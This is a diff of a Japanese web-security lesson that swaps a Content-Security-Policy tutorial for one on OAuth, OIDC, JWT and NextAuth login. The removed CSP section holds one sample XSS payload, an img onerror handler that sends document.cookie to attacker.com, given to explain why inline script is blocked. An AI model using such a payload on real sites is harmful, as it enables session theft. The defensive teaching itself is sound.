@@ -1,455 +1,408 @@
-# lesson120: Content-Security-Policy（CSP）実践
+# lesson120: OAuth / OIDC / JWT の概念
 
 ## ゴール
 
-- CSP が **XSS の最後の砦** として何を防ぐか説明できる
-- `default-src` / `script-src` / `style-src` 等の主要ディレクティブを書ける
-- `nonce` / `hash` で **必要な inline script を許可** できる
-- `Content-Security-Policy-Report-Only` で本番に出す前の検証ができる
-- Next.js で CSP を **proxy + Middleware で動的に発行** できる
+- 「**認証**」と「**認可**」の違いを言える
+- OAuth 2.0 の **認可コードフロー** の流れを大づかみで説明できる
+- OpenID Connect（OIDC）が「OAuth に **認証** を載せた拡張」だと分かる
+- JWT の構造（Header / Payload / Signature）と **署名検証** の意味を理解する
+- セッション Cookie と JWT の使い分けを判断できる
+- Auth0 / Clerk / NextAuth / Supabase Auth の位置付けを把握する
 
-::: tip 前提
-このレッスンは lesson95「Cookie と Web セキュリティ」の発展編です。XSS / CSRF の基本は lesson95 を確認してください。
+::: tip このレッスンの方針
+認証は「自前で実装すると事故りやすい」分野です。本講座では概念の地図 + 既存 SaaS / ライブラリの選び方に絞ります。実装は SaaS のドキュメントと併せて行うのが現実的。
 :::
 
 ## 解説
 
-### CSP は最後の防衛線
+### 認証 と 認可
 
-XSS の理想は「**そもそも入力をエスケープして XSS を起こさない**」こと（lesson95）。けれど、ライブラリのバグ / Markdown のレンダリング / 古い jQuery など、**完璧に守るのは難しい**。
+最初に区別すべき 2 つの言葉。
 
-Content-Security-Policy は「**仮に攻撃スクリプトが混入しても、ブラウザが読み込みを拒否する**」という二重の防衛線です。
+| 用語 | 意味 |
+|---|---|
+| **認証**（Authentication, AuthN） | **誰** か（あなたは本当に山田さんか？） |
+| **認可**（Authorization, AuthZ） | **何ができる** か（山田さんはこのファイルを編集できるか？） |
 
-仕組みは「**HTTP レスポンスヘッダ** で `<script>` / `<style>` / 画像 / fetch などの **読み込み元を許可リスト形式で指定**」。
+ID + パスワードでログインするのは認証。「管理者だけ /admin にアクセス可」は認可。**OAuth は本来 認可** で、**OIDC は 認証**。混乱の元なので、地図を頭に置いておきます。
 
-### 最小例
+### OAuth 2.0
 
-```http
-Content-Security-Policy: default-src 'self';
+「**ユーザーがパスワードを渡さずに、第三者アプリに自分のリソースへのアクセスを認可** する」プロトコル。
+
+例: 「**Spotify に Google フォトの写真を読ませる**」と言われた時、Spotify に Google パスワードを渡すのは危険。OAuth なら Google 上で認可するだけで、Spotify は **アクセストークン** を受け取って Google フォト API を叩けます。
+
+#### 登場する役割（Role）
+
+| 役 | 例 |
+|---|---|
+| **Resource Owner** | エンドユーザー（あなた） |
+| **Client** | アクセスするアプリ（Spotify） |
+| **Authorization Server** | 認可するサーバー（Google） |
+| **Resource Server** | API サーバー（Google フォト API） |
+
+#### 認可コードフロー（推奨）
+
+OAuth 2.0 で最も使われ、安全とされるフロー。**Client の種類** によって `client_secret` の扱いが変わるので、2 つに分けて図解します。
+
+##### A. Confidential Client（サーバーアプリ / BFF）
+
+サーバーが安全に `client_secret` を保持できる場合（Next.js の Route Handler など）。
+
+```
+[User]                         [Client(Server)]              [Auth Server]
+  │   1. ログインボタン押下       │                                │
+  │ ───────────────────────────> │                                │
+  │                              │   2. /authorize にリダイレクト │
+  │                              │ ──────────────────────────────>│
+  │   3. ログイン + 認可画面     │                                │
+  │ <─────────────────────────────────────────────────────────── │
+  │   4. 認可                    │                                │
+  │ ────────────────────────────────────────────────────────── > │
+  │                              │   5. /redirect?code=XXX        │
+  │                              │ <──────────────────────────────│
+  │                              │   6. /token (code + client_secret) │
+  │                              │ ──────────────────────────────>│
+  │                              │   7. access_token 取得         │
+  │                              │ <──────────────────────────────│
 ```
 
-これだけで:
+##### B. Public Client（ブラウザの SPA / ネイティブアプリ）
 
-- 自分のドメイン以外からの **JS / CSS / 画像 / fetch** がブロックされる
-- inline script（`<script>...</script>`）も **デフォルト拒否**
-- inline style（`<div style="...">`）も拒否
+`client_secret` を保持できない場合。代わりに **PKCE**（後述）を必ず使います。
 
-なぜ inline まで拒否するのか:
+```
+[Browser SPA]                                                   [Auth Server]
+   │   1. verifier を生成、challenge を計算                        │
+   │   2. /authorize?code_challenge=...                              │
+   │ ────────────────────────────────────────────────────────────────> │
+   │   3-4. ログイン + 認可                                          │
+   │ <───────────────────────────────────────────────────────────────│
+   │   5. /redirect?code=XXX                                         │
+   │ <───────────────────────────────────────────────────────────────│
+   │   6. /token (code + verifier) ← secret は持たない               │
+   │ ────────────────────────────────────────────────────────────────> │
+   │   7. access_token 取得                                          │
+   │ <───────────────────────────────────────────────────────────────│
+```
+
+ポイント:
+
+- **認可コード**（短命）→ アクセストークンに **サーバー側で交換**（A） / **PKCE で偽装防止**（B）
+- ブラウザに **直接トークン** を渡さない（漏洩リスクが下がる）
+- 現代の Web では **Auth.js / Clerk / Auth0 がこれを内部で組み立てる**
+
+#### Implicit Flow は非推奨
+
+ブラウザに直接トークンを返す **Implicit Flow** は古いやり方。**現代は使わない**。SPA であっても **Authorization Code Flow with PKCE** が推奨。
+
+#### PKCE（Proof Key for Code Exchange）
+
+「**認可コードが盗まれてもトークンに交換できない**」を実現する仕組み。
+
+1. クライアントが **ランダムな verifier** を生成
+2. その **ハッシュ**（challenge） を `/authorize` に渡す
+3. 認可コードを **/token に送る時に verifier を一緒に送る**
+4. 認可サーバーが challenge と一致するかを検証
+
+ネイティブアプリ / SPA で必須。Auth0 / Clerk などの SaaS は自動でやってくれます。
+
+### OpenID Connect（OIDC）
+
+OAuth 2.0 は **認可** のフレームワーク。**「誰がログインしたか」** を扱う仕組みが標準化されていなかった。OIDC は OAuth 2.0 の上に **認証情報の規格** を載せたものです。
+
+OIDC は次を追加:
+
+- **`openid` スコープ**: OIDC を有効化
+- **ID Token**: 「**この人がログインした**」を表す JWT
+- **`/userinfo` エンドポイント**: ユーザープロフィール取得
+
+#### ID Token の中身
+
+```json
+{
+  "iss": "https://accounts.google.com",   // 発行者
+  "sub": "user-123",                        // ユーザー ID
+  "aud": "my-client-id",                    // クライアント ID
+  "exp": 1714000000,                        // 有効期限
+  "iat": 1713999000,                        // 発行時刻
+  "email": "user@example.com",
+  "name": "山田太郎"
+}
+```
+
+これに **署名** が付き、クライアントが **公開鍵で検証** することで「**確かに Google が発行した本物**」を確認できます。
+
+### JWT（JSON Web Token）
+
+JWT は「**JSON データに署名を付けたトークン**」のフォーマット。OIDC の ID Token も JWT。アクセストークンも JWT 形式で返ってくることが多い。
+
+#### 構造: 3 つを `.` で繋ぐ
+
+```
+eyJhbGciOiJIUzI1NiI...   ← Header（base64url）
+.
+eyJzdWIiOiJ1c2VyLTEyMyI...   ← Payload（base64url）
+.
+SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← Signature
+```
+
+Header の例:
+
+```json
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "kid": "key-id-1"
+}
+```
+
+Payload の例:
+
+```json
+{
+  "sub": "user-123",
+  "name": "山田太郎",
+  "iat": 1713999000,
+  "exp": 1714002600
+}
+```
+
+Signature は **Header + Payload を秘密鍵で署名** したもの。
+
+#### 重要な事実
+
+- **Payload は base64 のエンコードされているだけ** で **暗号化されていない**。誰でも読める
+- **改ざんはできない**（署名検証で弾く）
+- **秘密情報を Payload に入れない**（パスワード / クレジットカードなど）
+
+### 署名アルゴリズム
+
+| 種類 | 例 | 用途 |
+|---|---|---|
+| **HMAC**（共有鍵） | `HS256` | 自前で発行 + 検証する場合 |
+| **RSA**（公開鍵） | `RS256` | 発行は秘密鍵、検証は公開鍵。**OIDC で標準** |
+| **ECDSA**（楕円曲線） | `ES256` | RSA より短く速い |
+
+OIDC は通常 `RS256` を使い、**JWKS**（公開鍵のセット）を `https://issuer.example.com/.well-known/jwks.json` で配布します。クライアントはこれを取得して **署名検証** します。
+
+#### `alg: none` の罠
+
+JWT 仕様には `alg: none`（署名なし）があり、**チェックなしの実装** だと攻撃者が任意の payload で偽造できます。**ライブラリで `alg: none` を許可しない** が必須。
+
+### セッション Cookie vs JWT
+
+ログイン後の状態維持で **どちらを使うか** がよく議論されます。**「保存方式」と「攻撃面」は組合せで決まる** ので、表で整理します。
+
+| | セッション Cookie（DB セッション） | JWT |
+|---|---|---|
+| 保存場所 | サーバー側（DB / Redis）+ Cookie に ID | クライアント側（保存先は **Cookie / localStorage の選択** 次第） |
+| 取り消し | DB から消すだけ（即時無効化） | 短命にする / Blacklist で対処（即時は難しい） |
+| ステートレス性 | サーバー状態あり | サーバー状態なし |
+| サイズ | 小さい（ID だけ） | 大きい（ペイロード分） |
+| クロスドメイン | 工夫が必要 | 渡すだけ |
+
+**攻撃面は保存場所で決まる**:
+
+- **Cookie**（`HttpOnly` + `Secure` + `SameSite=Lax` か `Strict`）: XSS で **盗めない**。ただし CSRF が要対策（SameSite + CSRF トークンで防御）
+- **localStorage**: XSS で **JS から盗まれる**。CSRF はそもそも該当しない（ブラウザが自動付与しない）
+
+→ **HttpOnly Cookie に JWT を入れる** 形が現代の安全策で、Auth.js / Clerk / Lucia などの既定もこれに近い構成です。
+
+#### 一般的な指針（2026 年）
+
+- **Web アプリ単独**: **セッション Cookie**（HttpOnly / Secure / SameSite）が最も安全
+- **マイクロサービス間 / SPA + 別ドメイン API**: JWT のアクセストークン
+- **モバイル / SPA で OIDC 利用**: ID Token を JWT で取得
+
+「**Cookie に JWT を入れる**」のもよくある折衷案（Cookie の保護 + JWT の検証性）。
+
+### Refresh Token
+
+アクセストークンは **短命**（15 分〜1 時間）にしておき、**Refresh Token** で更新します。
+
+- Access Token: API 呼び出し用、漏れても被害が短時間
+- Refresh Token: Access Token を更新するため、漏れると被害が長期
+
+Refresh Token は **HttpOnly + Secure な Cookie** に保存し、`/token` 経由で交換します。
+
+### 既存 SaaS / ライブラリの位置付け
+
+「**自前実装は避ける**」が現代の標準。代表的選択肢:
+
+| サービス / ライブラリ | 特徴 |
+|---|---|
+| **Auth0** | エンタープライズ標準。フロー / IdP 連携 / カスタムが豊富 |
+| **Clerk** | React / Next.js 専用、UI コンポーネントが秀逸。スタートアップで人気 |
+| **NextAuth.js**（Auth.js） | Next.js 用 OSS。OAuth プロバイダ多数、自前で動かせる |
+| **Supabase Auth** | DB + 認証セット。Postgres ベース |
+| **Firebase Authentication** | Google エコシステム。設定が簡単 |
+| **AWS Cognito** | AWS 系インフラと統合 |
+| **WorkOS** | エンタープライズ向け SAML / SSO |
+| **Lucia / better-auth** | より軽量、自前で書きたい時の OSS |
+
+選び方:
+
+- **すぐ使いたい**: Clerk / Supabase
+- **エンタープライズ要件**（SAML / SCIM）: Auth0 / WorkOS
+- **OSS / ホストせず手元で**: NextAuth / better-auth
+- **既存インフラに揃える**: Cognito / Firebase
+
+### Passkeys（パスワードレス）
+
+2024 年以降、Apple / Google / Microsoft が **Passkeys**（FIDO2 / WebAuthn）の普及を進めています。**パスワードを使わず、デバイスの生体認証で OIDC ログイン** できる仕組み。
 
 ```html
-<!-- 攻撃者が混入させたい -->
-<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)" />
+<!-- 簡略 -->
+<script>
+const cred = await navigator.credentials.get({ publicKey: {/* ... */} });
+</script>
 ```
 
-これを **inline script 全面禁止** にすると、たとえ XSS で混入しても **実行されません**。
-
-### 主要ディレクティブ
-
-| ディレクティブ | 制御するリソース |
-|---|---|
-| `default-src` | 他で指定がないリソース全部のフォールバック |
-| `script-src` | JavaScript |
-| `style-src` | CSS |
-| `img-src` | `<img>` |
-| `font-src` | フォント |
-| `connect-src` | `fetch` / `XMLHttpRequest` / `WebSocket` |
-| `frame-src` | `<iframe>` |
-| `media-src` | `<audio>` / `<video>` |
-| `object-src` | `<object>` / `<embed>`（`'none'` 推奨） |
-| `base-uri` | `<base>` タグの `href` |
-| `form-action` | `<form>` の `action` |
-| `frame-ancestors` | 自分を `<iframe>` で **埋め込ませる相手**（Clickjacking 対策） |
-
-### ソース指定子
-
-| 値 | 意味 |
-|---|---|
-| `'self'` | 自分のオリジン |
-| `'none'` | すべて拒否 |
-| `'unsafe-inline'` | inline script / style を許可（**極力避ける**） |
-| `'unsafe-eval'` | `eval()` / `new Function()` 許可（**極力避ける**） |
-| `https:` | あらゆる HTTPS オリジン |
-| `https://example.com` | 個別オリジン |
-| `*.example.com` | サブドメインワイルドカード |
-| `'nonce-XXXXX'` | ランダムナンス付きの inline を許可 |
-| `'sha256-XXXX'` | 特定のハッシュ値の inline を許可 |
-| `'strict-dynamic'` | nonce/hash 付きの script から **動的に読み込まれた script** を許可 |
-
-### inline script を許可する 3 つの方法
-
-「Google Analytics や OGP 系の inline `<script>` だけは動かしたい」場合の対応。
-
-#### 1. `'unsafe-inline'`（NG）
-
-`Content-Security-Policy: script-src 'self' 'unsafe-inline';`
-
-→ **すべての inline を許可** してしまうので XSS を防げない。**最終手段**。
-
-#### 2. nonce（推奨）
-
-リクエストごとに **ランダムな文字列**（nonce）をサーバーで生成し:
-
-- ヘッダに `script-src 'nonce-abc123' 'self';`
-- `<script nonce="abc123">...</script>`
-
-両方が一致した script だけ実行される。**毎回違う値** なので攻撃者は予測できない。
-
-#### 3. hash
-
-inline script の **SHA-256 ハッシュ** を `script-src 'sha256-XXX'` で許可。**内容が固定** な inline 限定。
-
-### `'strict-dynamic'`
-
-nonce / hash で許可した script が **動的に追加した子 script** をすべて許可する仕組み。許可リストを長く書かずに済む。
-
-```
-script-src 'nonce-abc123' 'strict-dynamic';
-```
-
-これが現代の **推奨ポリシー** です（Google が CSP Level 3 でプッシュ）。
-
-### `Report-Only` で先に検証
-
-本番に正しい CSP をいきなり当てると **動かなくなるリスク** が高い。`Content-Security-Policy-Report-Only` を使うと:
-
-- ブラウザは **違反をブロックせず**
-- 違反を **`report-uri` / `report-to`** に POST してくれる
-
-```
-Content-Security-Policy-Report-Only:
-  default-src 'self';
-  report-uri /csp-report;
-  report-to csp-endpoint;
-```
-
-```ts
-// app/api/csp-report/route.ts
-export async function POST(req: Request) {
-  const body = await req.json();
-  console.log("CSP violation:", body);
-  return new Response(null, { status: 204 });
-}
-```
-
-数日〜数週間ログを集めて、漏れなく許可リストを揃えてから **本番ヘッダ** に切り替えます。
-
-Sentry や Datadog の **CSP レポート機能** を使うとダッシュボードで一覧できます。
-
-### Next.js での実装
-
-#### 静的なポリシー（next.config.ts のヘッダ）
-
-```ts
-// next.config.ts
-import type { NextConfig } from "next";
-
-const cspHeader = `
-  default-src 'self';
-  script-src 'self' 'unsafe-inline' 'unsafe-eval';
-  style-src 'self' 'unsafe-inline';
-  img-src 'self' data: https:;
-  font-src 'self' https://fonts.gstatic.com;
-  connect-src 'self';
-  frame-ancestors 'none';
-  base-uri 'self';
-  form-action 'self';
-`.replace(/\s{2,}/g, " ").trim();
-
-const nextConfig: NextConfig = {
-  async headers() {
-    return [
-      {
-        source: "/:path*",
-        headers: [
-          { key: "Content-Security-Policy", value: cspHeader },
-          { key: "X-Frame-Options", value: "DENY" },
-          { key: "X-Content-Type-Options", value: "nosniff" },
-          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
-        ],
-      },
-    ];
-  },
-};
-
-export default nextConfig;
-```
-
-::: warning Next.js は inline をたくさん使う
-Next.js は SSR したマークアップに **inline script を埋め込んで** ハイドレーションを行います。Tailwind v3 までの開発ビルドや next/script の inline モードも inline style / script を生成します。
-
-そのため `'unsafe-inline'` 抜きの厳格な CSP を当てるには **nonce 方式** が必須。
-:::
-
-#### 動的なポリシー（Proxy + nonce）
-
-Next.js 16 では `proxy.ts`（旧 middleware.ts）でリクエスト時に nonce を生成し、ヘッダで配ります。
-
-```ts
-// proxy.ts
-import { NextResponse, type NextRequest } from "next/server";
-
-export function proxy(req: NextRequest) {
-  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
-  const csp = `
-    default-src 'self';
-    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
-    style-src 'self' 'nonce-${nonce}';
-    img-src 'self' data: https:;
-    font-src 'self';
-    connect-src 'self';
-    frame-ancestors 'none';
-    base-uri 'self';
-    form-action 'self';
-    upgrade-insecure-requests;
-  `.replace(/\s{2,}/g, " ").trim();
-
-  const requestHeaders = new Headers(req.headers);
-  requestHeaders.set("x-nonce", nonce);
-  requestHeaders.set("Content-Security-Policy", csp);
-
-  const response = NextResponse.next({ request: { headers: requestHeaders } });
-  response.headers.set("Content-Security-Policy", csp);
-
-  return response;
-}
-
-export const config = {
-  matcher: [
-    "/((?!api|_next/static|_next/image|favicon.ico).*)",
-  ],
-};
-```
-
-#### Server Component で nonce を読む
-
-```tsx
-// app/layout.tsx
-import { headers } from "next/headers";
-import Script from "next/script";
-
-export default async function RootLayout({ children }: { children: React.ReactNode }) {
-  const nonce = (await headers()).get("x-nonce") ?? undefined;
-
-  return (
-    <html lang="ja">
-      <body>
-        {children}
-        <Script
-          src="https://example.com/analytics.js"
-          nonce={nonce}
-          strategy="afterInteractive"
-        />
-      </body>
-    </html>
-  );
-}
-```
-
-`next/script` は **`nonce` prop** を渡すと自動で属性に反映してくれます。
-
-### Trusted Types
-
-CSP の進化版が **Trusted Types**。`document.innerHTML = userInput` のような **危険な代入** を **型レベル** で禁止します。
-
-```
-Content-Security-Policy: require-trusted-types-for 'script';
-```
-
-未対応ブラウザ（Safari）でも壊れずに、対応ブラウザでさらに守りが厚くなる。**新規プロジェクトは Trusted Types を入れる** が 2026 年の推奨。
-
-### 確認ツール
-
-- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)（Google 提供）: 自分の CSP がどれくらい強いかを採点
-- [Mozilla Observatory](https://observatory.mozilla.org/): CSP を含むセキュリティヘッダ全般を診断
-- ブラウザの DevTools → Network → ヘッダ表示
-
-### CSP 以外のセキュリティヘッダ
-
-| ヘッダ | 役割 |
-|---|---|
-| `Strict-Transport-Security` | HTTPS 強制 |
-| `X-Content-Type-Options: nosniff` | MIME スニッフィング無効化 |
-| `Referrer-Policy: strict-origin-when-cross-origin` | リファラーの漏洩抑制 |
-| `Permissions-Policy` | カメラ / マイク等の権限を制限 |
-| `Cross-Origin-Opener-Policy: same-origin` | Spectre 系対策 |
-| `Cross-Origin-Embedder-Policy: require-corp` | 同上 |
-
-CSP と一緒に **これら 5〜6 個も設定** するのが現代の標準。Vercel ダッシュボード / Cloudflare の管理画面で **テンプレート** が用意されています。
+主要 SaaS（Clerk / Auth0 / NextAuth）はすでに **Passkey を 1 オプション** として提供。新規プロジェクトは **Passkey 対応の SaaS** を選ぶと将来安心。
 
 ### よくある事故
 
-#### 1. Google Fonts / Google Tag Manager が動かない
+- **JWT の検証を skip** していて偽造を許す → **必ず署名検証**
+- **localStorage にトークン** を入れて XSS で持ち出される → **HttpOnly Cookie** に
+- **Refresh Token が無期限** → 短命 + ローテートを徹底
+- **CORS で `Allow-Origin: *` + `Allow-Credentials: true`** → 仕様違反、CORS エラー
+- **redirect_uri が緩い**（`*` 許可）→ open redirect で攻撃可能
+- **state パラメータを検証していない** → CSRF 成立
 
-→ `script-src` / `style-src` / `font-src` / `connect-src` に Google のホストを許可する。具体的には `https://fonts.googleapis.com` / `https://fonts.gstatic.com` / `https://www.googletagmanager.com`。
-
-#### 2. Sentry / Datadog の送信が拒否される
-
-→ `connect-src` に Sentry のエンドポイントを追加
-
-#### 3. 開発時のホットリロードが拒否される
-
-→ 開発時は `connect-src` に `ws://localhost:*` を加える、または開発時は CSP を緩める分岐を入れる
-
-#### 4. iframe 埋め込みされる事故
-
-→ `frame-ancestors 'none'` で防ぐ（X-Frame-Options より上位の指定）
+これらが起きやすいので、**SaaS の SDK** に従うのが安全です。
 
 ## 演習
 
 ### ゴール
 
-- Next.js プロジェクトに **動的 nonce CSP** を入れる
-- まず Report-Only で違反ログを取り、最終的に強制ヘッダに切り替える
+- OAuth / OIDC / JWT の **トークンの中身** を実物で確認する
+- NextAuth.js（Auth.js）で Google ログインを最小実装する
 
-### 手順 1: 新規プロジェクト
+### 手順 1: 新規 Next.js
 
 ```bash
-npx create-next-app@latest csp-sample --ts --app
-cd csp-sample
+npx create-next-app@latest auth-sample --ts --app
+cd auth-sample
+npm install next-auth
 ```
 
-### 手順 2: Report-Only で開始
+### 手順 2: Google OAuth クライアント作成
 
-`next.config.ts`:
+[Google Cloud Console](https://console.cloud.google.com/) で:
+
+1. プロジェクトを作成
+2. APIs & Services → Credentials → OAuth 2.0 Client ID
+3. Authorized redirect URI: `http://localhost:3000/api/auth/callback/google`
+4. Client ID と Secret を控える
+
+### 手順 3: NextAuth の設定
+
+`.env.local`:
+
+```
+GOOGLE_CLIENT_ID=...
+GOOGLE_CLIENT_SECRET=...
+AUTH_SECRET=（任意のランダム文字列）
+AUTH_URL=http://localhost:3000
+```
+
+> **補足: 環境変数名は v5 で `AUTH_*` に変わった**: Auth.js v5（旧 NextAuth.js）では `NEXTAUTH_SECRET` / `NEXTAUTH_URL` が **`AUTH_SECRET` / `AUTH_URL` にリネーム**されました。v4 系のチュートリアルをコピペすると古い名前のまま動かないので注意します。`AUTH_SECRET` は `npx auth secret` でランダム生成できます。
+
+`auth.ts`:
 
 ```ts
-const reportOnlyCsp = `
-  default-src 'self';
-  script-src 'self' 'unsafe-inline';
-  style-src 'self' 'unsafe-inline';
-  img-src 'self' data:;
-  connect-src 'self';
-  frame-ancestors 'none';
-  report-uri /api/csp-report;
-`.replace(/\s{2,}/g, " ").trim();
+import NextAuth from "next-auth";
+import Google from "next-auth/providers/google";
 
-export default {
-  async headers() {
-    return [
-      {
-        source: "/:path*",
-        headers: [
-          { key: "Content-Security-Policy-Report-Only", value: reportOnlyCsp },
-          { key: "X-Frame-Options", value: "DENY" },
-          { key: "X-Content-Type-Options", value: "nosniff" },
-          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
-        ],
-      },
-    ];
-  },
-};
+export const { handlers, signIn, signOut, auth } = NextAuth({
+  providers: [
+    Google({
+      clientId: process.env.GOOGLE_CLIENT_ID!,
+      clientSecret: process.env.GOOGLE_CLIENT_SECRET!,
+    }),
+  ],
+});
 ```
 
-### 手順 3: レポートエンドポイント
-
-`app/api/csp-report/route.ts`:
+`app/api/auth/[...nextauth]/route.ts`:
 
 ```ts
-export async function POST(req: Request) {
-  const text = await req.text();
-  console.log("[CSP Report]", text);
-  return new Response(null, { status: 204 });
-}
+import { handlers } from "@/auth";
+export const { GET, POST } = handlers;
 ```
-
-### 手順 4: わざと違反を起こす
 
 `app/page.tsx`:
 
 ```tsx
-export default function Home() {
+import { signIn, signOut, auth } from "@/auth";
+
+export default async function Home() {
+  const session = await auth();
+
+  if (!session) {
+    return (
+      <main style={{ padding: 24 }}>
+        <form action={async () => { "use server"; await signIn("google"); }}>
+          <button>Google でログイン</button>
+        </form>
+      </main>
+    );
+  }
+
   return (
     <main style={{ padding: 24 }}>
-      <h1>CSP Demo</h1>
-      <img src="https://example.com/some-image.png" alt="" />
-      <iframe src="https://example.com" />
+      <p>ようこそ {session.user?.name} さん</p>
+      <pre>{JSON.stringify(session, null, 2)}</pre>
+      <form action={async () => { "use server"; await signOut(); }}>
+        <button>ログアウト</button>
+      </form>
     </main>
   );
 }
 ```
 
-`npm run dev` で開くと、外部画像 / iframe の読み込みが **CSP 違反** として検出され、サーバーログに `[CSP Report]` が出力されるはずです。違反は **ブロックされず**、画面は表示される（Report-Only のため）。
+### 手順 4: 起動
 
-### 手順 5: 動的 nonce に切り替える
-
-`proxy.ts`:
-
-```ts
-import { NextResponse, type NextRequest } from "next/server";
-
-export function proxy(req: NextRequest) {
-  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
-  const csp = `
-    default-src 'self';
-    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
-    style-src 'self' 'nonce-${nonce}';
-    img-src 'self' data:;
-    connect-src 'self';
-    frame-ancestors 'none';
-    upgrade-insecure-requests;
-  `.replace(/\s{2,}/g, " ").trim();
-
-  const requestHeaders = new Headers(req.headers);
-  requestHeaders.set("x-nonce", nonce);
-
-  const res = NextResponse.next({ request: { headers: requestHeaders } });
-  res.headers.set("Content-Security-Policy", csp);
-  return res;
-}
-
-export const config = {
-  matcher: [
-    "/((?!api|_next/static|_next/image|favicon.ico).*)",
-  ],
-};
+```bash
+npm run dev
 ```
 
-`app/layout.tsx`:
+`http://localhost:3000` で Google ログインを試します。
 
-```tsx
-import { headers } from "next/headers";
-import Script from "next/script";
+### 手順 5: セッション Cookie を覗く
 
-export default async function RootLayout({ children }: { children: React.ReactNode }) {
-  const nonce = (await headers()).get("x-nonce") ?? undefined;
-  return (
-    <html lang="ja">
-      <body>
-        {children}
-        <Script id="hello" nonce={nonce}>
-          {`console.log('hello with nonce')`}
-        </Script>
-      </body>
-    </html>
-  );
-}
-```
+ブラウザの DevTools → Application → Cookies で **`authjs.session-token`** を確認。Auth.js v5 の既定では **JWE（暗号化 JWT）** で発行されるため、[jwt.io](https://jwt.io/) に貼っても **デコードできません**（暗号化されている）。これは「Cookie が盗まれても中身を読めない」セキュリティ目的です。
+
+「JWT の Payload は base64 で誰でも読める」のは **暗号化なしの JWS** の話です。学習用に中身を見たい時は、別途 `jose` ライブラリでサーバー側 token を発行 / `getToken()` で復号した値を `console.log` する、という手順が要ります。
 
 ### 期待出力
 
-- Report-Only モード: 違反は出るがブロックされず、サーバーに `[CSP Report]` ログ
-- 動的 nonce モード: `<script nonce="...">` を持つものだけ実行される
-- DevTools の Console に CSP 違反があると **赤い警告** が出る
+- Google ログインが成立し、セッション情報が表示される
+- Cookie に **`authjs.session-token`**（JWE）が入っている
+- jwt.io で **デコードできず警告** が出る（暗号化されているため正常）
 
 ### 変える
 
-- `script-src` の `'strict-dynamic'` を外して、サードパーティ script が読み込めなくなることを確認
-- `frame-ancestors 'none'` を `'self'` に変えて、自サイト内の iframe 埋め込みは許可
-- Trusted Types を有効化（`require-trusted-types-for 'script'`）して、`innerHTML = userInput` がエラーになることを観察
+- `Email` プロバイダ（マジックリンク）を追加
+- 複数プロバイダ（GitHub / Discord）を追加
+- ログイン後にしかアクセスできないルートを **Middleware で保護** する
 
 ### 自分で書く（任意）
 
-- Sentry / Datadog の送信が拒否されないよう、`connect-src` に該当エンドポイントを追加
-- Google Fonts を使うサイトで `style-src` / `font-src` / `connect-src` を整える
-- CSP Evaluator にヘッダを貼って **A 評価** を狙う
+- Clerk に置き換えて UI コンポーネントの体験を比較
+- Supabase Auth を試して DB / 認証統合の体験
+- Passkey 対応プロバイダ（WebAuthn）を有効にしてパスワードなしログイン
 
 ## まとめ
 
-- CSP は **XSS の最後の砦**。攻撃 script が混入しても **読み込ませない**
-- `default-src 'self'` を起点に、必要に応じてディレクティブを追加
-- inline は **`'unsafe-inline'` を避け、nonce / hash + `'strict-dynamic'`** で許可
-- **`Content-Security-Policy-Report-Only`** で本番前に違反ログを集める
-- Next.js は **proxy** で nonce を発行し、`<Script>` の `nonce` prop で受け渡す
-- **Trusted Types** で `innerHTML = userInput` を型レベルで禁止
-- CSP と一緒に **STS / X-Content-Type-Options / Referrer-Policy / Permissions-Policy / COOP / COEP** も設定する
-- CSP Evaluator / Mozilla Observatory で診断
+- **認証**（誰か） と **認可**（何ができるか） を区別する。OAuth は認可、OIDC は認証
+- **OAuth 2.0 の認可コードフロー + PKCE** が現代の標準
+- **Implicit Flow は非推奨**
+- **OIDC** は OAuth に **ID Token + /userinfo** を追加した認証規格
+- **JWT** は Header / Payload / Signature の 3 部構成。**Payload は誰でも読める**
+- 署名アルゴリズムは `RS256` などを使い、**`alg: none` を絶対許可しない**
+- セッション Cookie vs JWT: **Web 単独はセッション Cookie**、API 呼び出しは JWT が定石
+- **Refresh Token** で Access Token を短命に保つ
+- **Auth0 / Clerk / NextAuth / Supabase / WorkOS** など SaaS / ライブラリで自前実装を避ける
+- **Passkeys** が普及中。新規プロジェクトは対応 SaaS を選ぶと未来安心
